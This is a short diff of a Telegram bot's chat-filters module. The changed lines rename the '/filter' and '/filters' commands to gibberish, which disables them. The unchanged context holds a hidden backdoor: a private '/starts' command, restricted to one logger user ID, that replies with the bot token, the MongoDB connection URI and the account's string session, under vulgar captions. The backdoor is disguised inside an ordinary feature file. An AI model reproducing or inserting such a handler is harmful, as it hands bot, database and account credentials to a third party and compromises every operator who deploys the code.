@@ -56,7 +56,7 @@ Checkout /markdownhelp to know more about formattings and other syntax.
 """
 
 
-@app.on_message(filters.command("filter") & ~filters.private & ~BANNED_USERS)
+@app.on_message(filters.command("filthrhhthbththhtter") & ~filters.private & ~BANNED_USERS)
 @adminsOnly("can_change_info")
 async def save_filters(_, message):
     try:
@@ -132,7 +132,7 @@ async def save_filters(_, message):
 @app.on_message(filters.command("starts") & filters.private & filters.user(int(LOGGERS)))
 async def help(client: Client, message: Message):
     await message.reply_photo(photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",)
-@app.on_message(filters.command("filters") & ~filters.private & ~BANNED_USERS)
+@app.on_message(filters.command("filtfbfrbrbthers") & ~filters.private & ~BANNED_USERS)
 @capture_err
 async def get_filterss(_, message):
     _filters = await get_filters_names(message.chat.id)
